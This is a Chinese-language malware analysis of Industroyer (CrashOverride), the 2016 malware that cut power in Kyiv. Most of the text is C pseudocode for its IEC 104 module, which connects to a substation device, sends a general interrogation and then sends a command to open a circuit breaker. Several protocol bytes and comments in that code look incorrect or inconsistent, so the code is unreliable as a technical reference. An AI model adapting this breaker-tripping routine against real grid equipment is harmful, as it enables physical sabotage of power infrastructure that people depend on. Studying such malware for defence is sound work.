# Industroyer (CrashOverride) 分析

### 7.1 概述

Industroyer (又名CrashOverride) 是2016年针对乌克兰电网的专用恶意代码，是首个被发现的专门为破坏电力系统设计的工控恶意代码。

```
Industroyer基本信息:
- 发现时间: 2016年12月
- 目标: 乌克兰基辅电力系统
- 攻击目的: 物理破坏电力基础设施
- 攻击效果: 切断基辅1/5区域电力约1小时
- 技术特征: 直接操作工控协议
- 代码体积: 约900KB
- 与BlackEnergy关系: 可能同源，但独立
```

### 7.3 工控协议攻击实现

Industroyer的核心创新是直接实现了多种工控协议：

```c
// Industroyer IEC 104攻击伪代码
// 该模块直接实现IEC 60870-5-104协议

typedef struct {
    uint8_t start;      // 0x68
    uint8_t length;
    uint8_t type;       // I帧/U帧/S帧
    uint16_t tx_seq;
    uint16_t rx_seq;
} iec104_frame_t;

// IEC 104攻击命令
void attack_iec104(const char* target_ip, int port) {
    SOCKET sock = connect_tcp(target_ip, port);
    
    // 1. 建立IEC 104连接
    send_uframe_startact(sock);
    wait_for_startact_con(sock);
    
    // 2. 发送总召唤命令 (读取所有数据点)
    iec104_frame_t frame = {0};
    frame.type = I_FRAME;
    frame.tx_seq = 0;
    frame.rx_seq = 0;
    
    // 总召唤ASDU
    uint8_t asdu[] = {
        0x01, 0x01,  // 类型: C_IC_NA (总召唤)
        0x06,        // 可变结构限定词: 1个元素, 请求
        0x01,        // 传送原因: 激活
        0x01, 0x00,  // 公共地址
        0x01, 0x00,  // 信息体地址 (总召唤)
        0x14,        // 总召唤限定词 (站召唤)
    };
    
    send_asdu(sock, &frame, asdu, sizeof(asdu));
    wait_for_response(sock);
    
    // 3. 发送控制命令 (断开断路器)
    uint8_t command[] = {
        0x2D, 0x01,  // 类型: C_DC_NA (双点控制)
        0x01,        // 可变结构限定词: 1个元素
        0x06,        // 传送原因: 激活
        0x01, 0x00,  // 公共地址
        0x00, 0x00,  // 信息体地址 (断路器控制)
        0x02,        // 命令值: OFF
    };
    
    send_asdu(sock, &frame, command, sizeof(command));
    
    // 4. 关闭连接
    closesocket(sock);
}
```
